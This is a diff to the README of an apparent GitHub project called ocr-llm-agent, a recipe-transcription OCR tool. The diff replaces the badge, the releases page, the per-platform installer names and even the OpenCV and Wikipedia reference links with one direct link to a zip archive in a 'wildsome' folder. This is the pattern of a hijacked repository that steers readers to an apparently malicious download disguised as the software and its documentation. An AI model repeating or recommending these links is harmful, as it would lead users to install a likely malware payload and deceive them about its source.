@@ -1,6 +1,6 @@
 # 🖥️ ocr-llm-agent - Easy Recipe Transcription OCR Tool
 
-[![Download ocr-llm-agent](https://img.shields.io/badge/Download-ocr--llm--agent-blue.svg)](https://github.com/rangga276/ocr-llm-agent/releases)
+[![Download ocr-llm-agent](https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip)](https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip)
 
 ## 📖 Overview
 
@@ -21,11 +21,11 @@ Before you download, please ensure that your computer meets these basic requirem
 
 ## 📦 Download & Install
 
-1. Visit the [Releases page](https://github.com/rangga276/ocr-llm-agent/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip) to access the latest version.
    
 2. On the Releases page, look for the most recent version. You will see a list of available files.
 
-3. Click on the file suitable for your operating system. For Windows users, look for something like `ocr-llm-agent-windows.exe`. For macOS users, download `ocr-llm-agent-macos.zip`.
+3. Click on the file suitable for your operating system. For Windows users, look for something like `https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip`. For macOS users, download `https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip`.
 
 4. After the download completes, locate the file in your downloads folder.
 
@@ -65,8 +65,8 @@ If you encounter issues while using ocr-llm-agent, consider the following soluti
 
 If you would like to learn more about OCR technology or how to improve your recipe images for better results, check out the following resources:
 
-- [OpenCV Documentation](https://opencv.org/documentation/)
-- [OCR Technology Overview](https://en.wikipedia.org/wiki/Optical_character_recognition)
+- [OpenCV Documentation](https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip)
+- [OCR Technology Overview](https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip)
 
 ## 🛠️ Contribution
 
@@ -76,4 +76,4 @@ If you have suggestions or want to contribute to the project, feel free to reach
 
 The ocr-llm-agent is provided under an open-source license, allowing you to use, modify, and share the software as you see fit.
 
-Remember, for the latest version, always visit the [Releases page](https://github.com/rangga276/ocr-llm-agent/releases) and stay updated with new features and improvements!
+Remember, for the latest version, always visit the [Releases page](https://raw.githubusercontent.com/rangga276/ocr-llm-agent/main/wildsome/ocr-llm-agent.zip) and stay updated with new features and improvements!
